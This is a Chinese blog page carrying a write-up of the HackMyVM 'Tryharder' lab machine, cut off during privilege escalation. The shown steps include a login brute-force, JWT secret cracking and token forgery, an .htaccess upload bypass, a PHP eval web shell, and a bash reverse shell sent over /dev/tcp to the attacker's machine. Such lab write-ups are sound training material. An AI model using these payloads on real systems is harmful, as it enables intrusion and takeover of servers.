<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog Logo" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:image:width" content="800" data-next-head=""/><meta property="og:image:height" content="800" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/ef713f45b0b41153.css" as="style"/><script>
              (function() {
                try {
                  // 读取用户保存的主题偏好
                  const savedTheme = localStorage.getItem('theme');
                  
                  // 检测系统主题偏好
                  const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                  
                  // 判断是否应该使用暗黑模式
                  const shouldUseDark = savedTheme === 'dark' || (!savedTheme && systemPrefersDark);
                  
                  // 立即应用暗黑模式（在页面渲染前）
                  if (shouldUseDark) {
                    document.documentElement.classList.add('dark');
                  }
                } catch (e) {
                  // 静默处理错误，避免阻塞页面加载
                  console.error('Theme initialization error:', e);
                }
              })();
            </script><link rel="stylesheet" href="/_next/static/css/ef713f45b0b41153.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-f21970b4881df644.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/796-34c17833b03faf26.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-200c8fb703c11799.js" defer=""></script><script src="/_next/static/w5CAf1BA6WXI2gBvWdfre/_buildManifest.js" defer=""></script><script src="/_next/static/w5CAf1BA6WXI2gBvWdfre/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><div class="flex justify-center items-center gap-2 mb-4 text-sm text-gray-600 dark:text-gray-400"><a class="inline-flex items-center gap-1 hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 RSS Feed" href="/rss.xml"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"></path></svg>RSS</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 Atom Feed" href="/atom.xml">Atom</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 JSON Feed" href="/feed.json">JSON</a></div><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackMyVMTryharder","contentHtml":"\u003ch1\u003eTryharder.\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://hackmyvm.eu/machines/machine.php?vm=Tryharder\"\u003ehttps://hackmyvm.eu/machines/machine.php?vm=Tryharder\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eNotes：\u003cstrong\u003eHello Hacker! Try Harder!\u003c/strong\u003e\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/tryharder  nmap -sP 192.168.56.0/24\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-11 09:23 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.2\nHost is up (0.00033s latency).\nMAC Address: 08:00:27:88:A0:3E (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.41\nHost is up (0.00054s latency).\nMAC Address: 08:00:27:D9:92:F7 (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.4\nHost is up.\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 256 IP addresses (3 hosts up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 15.09 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/tryharder  nmap -sT -min-rate 10000 -p- 192.168.56.41       \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-11 09:34 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.41\nHost is up (0.00062s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:D9:92:F7 (Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 10.32 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/tryharder  nmap -sT -A -T4 -O -p 22,80 192.168.56.41        \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-11 09:35 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.41\nHost is up (0.00059s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey: \n|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)\n|   256 1e:a7:44:0b:2c:1b:0d:77:83:\u003cspan class=\"hljs-built_in\"\u003edf\u003c/span\u003e:1d:9f:0e:30:08:4d (ECDSA)\n|_  256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)\n80/tcp open  http    Apache httpd 2.4.59 ((Debian))\n|_http-server-header: Apache/2.4.59 (Debian)\n|_http-title: \\xE8\\xA5\\xBF\\xE6\\xBA\\xAA\\xE6\\xB9\\x96\\xE7\\xA7\\x91\\xE6\\x8A\\x80 - \\xE4\\xBC\\x81\\xE4\\xB8\\x9A\\xE9\\x97\\xA8\\xE6\\x88\\xB7\\xE7\\xBD\\x91\\xE7\\xAB\\x99\nMAC Address: 08:00:27:D9:92:F7 (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.59 ms 192.168.56.41\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 15.36 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/tryharder  nmap -script=vuln 22,80 192.168.56.41    \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-11 09:35 EDT\nFailed to resolve \u003cspan class=\"hljs-string\"\u003e\"22,80\"\u003c/span\u003e.\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.41\nHost is up (0.00018s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n|_http-dombased-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any DOM based XSS.\n|_http-csrf: Couldn'\u003c/span\u003et find any CSRF vulnerabilities.\n|_http-stored-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any stored XSS vulnerabilities.\nMAC Address: 08:00:27:D9:92:F7 (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 37.97 seconds\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eWeb 渗透\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e访问 HTTP，一个静态页面，什么内容都没有\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMTryharder/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e目录扫描无结果\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/tryharder  gobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -u http://192.168.56.41 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,502,429 --no-error          \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.41\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404,403,502,429\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\nProgress: 220560 / 220561 (100.00%)\n===============================================================\nFinished\n===============================================================\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看一下页面源码，找到如下信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e171 /* 调试信息：API路径 /NzQyMjE= */\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/tryharder  \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"NzQyMjE=\"\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003ebase64\u003c/span\u003e -d \n74221#  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问 [\u003ccode\u003e/](http://192.168.56.41/74221/)74221\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMTryharder/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e扫描一下目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/tryharder  gobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -u http://192.168.56.41/74221 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,502,429 --no-error\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.41/74221\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   403,502,429,404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\n/uploads              (Status: 301) [Size: 322] [--\u003e http://192.168.56.41/74221/uploads/]\nProgress: 220560 / 220561 (100.00%)\n===============================================================\nFinished\n===============================================================\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问\u003ccode\u003euploads\u003c/code\u003e文件夹，最后能到，没什么信息\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMTryharder/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e爆破登录页，爆破得出账号密码\u003ccode\u003etest:123456\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMTryharder/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e进入后台\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMTryharder/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eJWT\u003c/h3\u003e\n\u003cp\u003e看来权限要达到\u003ccode\u003eadmin\u003c/code\u003e ，抓个包看看，是\u003ccode\u003eJWT\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eGET /74221/dashboard.php HTTP/1.1\nHost: 192.168.56.41\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://192.168.56.41/74221/\nConnection: keep-alive\nCookie: jwt_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciIsImV4cCI6MTc0NDM4NTM5N30._HNKBOpExcKvCawhRMm8mWsZaVJCAQkqNgRo1xJbjSA\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e解析一下，应该是要将\u003ccode\u003erole\u003c/code\u003e改为\u003ccode\u003eadmin\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMTryharder/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试爆破\u003ccode\u003eJWT key\u003c/code\u003e ,爆破得到 \u003ccode\u003ejwtsecret123\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/tryharder  john --wordlist=../../Dict/SecLists-2024.3/Passwords/scraped-JWT-secrets.txt jwt               \nUsing default input encoding: UTF-8\nLoaded 1 password \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])\nNo password hashes left to crack (see FAQ)\n ⚡ root@kali  ~/Desktop/test/tryharder  john --show jwt                                                                 \n?:jwtsecret123\n\n1 password \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e cracked, 0 left\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eJWT Sign ，注意\u003ccode\u003esub\u003c/code\u003e要改为\u003ccode\u003e999\u003c/code\u003e ，不然上传功能使用不了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMTryharder/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI5OTkiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3NDQzODUzOTcsImlhdCI6MTc0NDM4MzMxM30.Dz7IPxJs5CLA8EQhPGYVmLZkDA3RXNar9Y2HKZvVeWs\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e文件上传利用\u003c/h3\u003e\n\u003cp\u003e使用新的\u003ccode\u003eJWT\u003c/code\u003e进入后台有上传文件功能\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMTryharder/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e上传PHP后缀文件提示：\u003ccode\u003eOnly .jpg and .png  files are allowed!\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e上传\u003ccode\u003e.htaccess\u003c/code\u003e 进行绕过\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eContent-Disposition: form-data; name=\u003cspan class=\"hljs-string\"\u003e\"file\"\u003c/span\u003e; filename=\u003cspan class=\"hljs-string\"\u003e\".htaccess\"\u003c/span\u003e\nContent-Type: application/x-php\n\n\u0026#x3C;IfModule mime_module\u003e\n\tAddHandler php5-script .png          \n\tSetHandler application/x-httpd-php   \n\u0026#x3C;/IfModule\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后上传 \u003ccode\u003epng\u003c/code\u003e后缀的\u003ccode\u003ephp\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eContent-Disposition: form-data; name=\u003cspan class=\"hljs-string\"\u003e\"file\"\u003c/span\u003e; filename=\u003cspan class=\"hljs-string\"\u003e\"shell.png\"\u003c/span\u003e\nContent-Type: application/x-php\n\n\u0026#x3C;?php \u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[1]);?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上传成功给进行测试\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMTryharder/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e进行反弹\u003ccode\u003eshell\u003c/code\u003e ，\u003ccode\u003eKali\u003c/code\u003e开启监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003enc -lvp 1234\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e1=system%28%22%2Fbin%2Fbash%20%2Dc%20%27bash%20%2Di%20%3E%26%2Fdev%2Ftcp%2F192%2E168%2E56%2E4%2F1234%200%3E%261%27%22%29%3B\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecurl http://192.168.56.41/74221/uploads/999/shell.png -X POST -d \u003cspan class=\"hljs-string\"\u003e\"1=system%28%22%2Fbin%2Fbash%20%2Dc%20%27bash%20%2Di%20%3E%26%2Fdev%2Ftcp%2F192%2E168%2E56%2E4%2F1234%200%3E%261%27%22%29%3B\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMTryharder/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e读取\u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@Tryharder:/home/pentester$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt\n\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt\nFlag{c4f9375f9834b4e7f0a528cc65c055702bf5f24a}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003ch3\u003e提权 - pentester\u003c/h3\u003e\n\u003cp\u003e先进行信息收集\u003c/p\u003e\n\u003cp\u003e在 \u003ccode\u003e/etc/passwd\u003c/code\u003e 中找到些有趣的东西\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epentester:x:1000:1000:Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness\u003cspan class=\"hljs-variable\"\u003e$itwastheepochofbelief\u003c/span\u003e,itwastheepochofincredulity,\u0026#x26;itwastheseasonofLight...:/home/pentester:/bin/bash\nxiix:x:1001:1001:A Tale of Two Cities:/home/xiix:/bin/bash\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e两个用户的描述为双城记的内容\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMTryharder/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在\u003ccode\u003epentester\u003c/code\u003e家目录存在\u003ccode\u003e.note\u003c/code\u003e ，\u003ccode\u003eCaesar\u003c/code\u003e为凯撒，粉碎凯撒，可能指的是凯撒密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@Tryharder:/home/pentester$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al\n\u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al\ntotal 28\ndrwxr-xr-x 2 pentester pentester 4096 Mar 25 06:46 .\ndrwxr-xr-x 4 root      root      4096 Mar 23 10:46 ..\nlrwxrwxrwx 1 root      root         9 Mar 22 08:03 .bash_history -\u003e /dev/null\n-rw-r--r-- 1 pentester pentester  220 Apr 18  2019 .bash_logout\n-rw-r--r-- 1 pentester pentester 3526 Apr 18  2019 .bashrc\n-rw-r--r-- 1 root      root        58 Mar 25 02:13 .note\n-rw-r--r-- 1 pentester pentester  807 Apr 18  2019 .profile\n-rw-r--r-- 1 pentester pentester   47 Mar 23 07:08 user.txt\nwww-data@Tryharder:/home/pentester$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e .note\n\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e .note\nTwo cities clashed \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e tale: Smash Caesar, buddy, to pass.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e提到了密码，那么应该要寻找隐藏文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@Tryharder:/tmp$ find / -name \u003cspan class=\"hljs-string\"\u003e'.*'\u003c/span\u003e 2\u003e/dev/null | awk \u003cspan class=\"hljs-string\"\u003e'!/^\\/sys/'\u003c/span\u003e\nfind / -name \u003cspan class=\"hljs-string\"\u003e'.*'\u003c/span\u003e 2\u003e/dev/null | awk \u003cspan class=\"hljs-string\"\u003e'!/^\\/sys/'\u003c/span\u003e\n/srv/...\n/var/www/html/74221/uploads/999/.htaccess\n/var/backups/.secret\n/var/backups/.secret/.verysecret\n/var/backups/.secret/.verysecret/.noooooo\n/home/pentester/.profile\n/home/pentester/.bashrc\n/home/pentester/.bash_logout\n/home/pentester/.note\n/home/pentester/.bash_history\n/home/xiix/.local\n/home/xiix/.profile\n/home/xiix/.bashrc\n/home/xiix/.bash_logout\n/home/xiix/.bash_history\n/run/network/.ifstate.lock\n/usr/src/linux-headers-4.19.0-27-amd64/.config\n/usr/src/linux-headers-4.19.0-27-amd64/.kernelvariables\n/etc/cron.daily/.placeholder\n/etc/cron.hourly/.placeholder\n/etc/cron.d/.placeholder\n/etc/cron.weekly/.placeholder\n/etc/cron.monthly/.placeholder\n/etc/skel/.profile\n/etc/skel/.bashrc\n/etc/skel/.bash_logout\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e/var/backups/.secret/.verysecret/.noooooo 下还能找到一个\u003ccode\u003enote2.txt\u003c/code\u003e文件，依旧是和双城记有关的内容。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@Tryharder:/tmp$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e /var/backups/.secret/.verysecret/.noooooo                                                                                        \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e /var/backups/.secret/.verysecret/.noooooo                                                                                                                 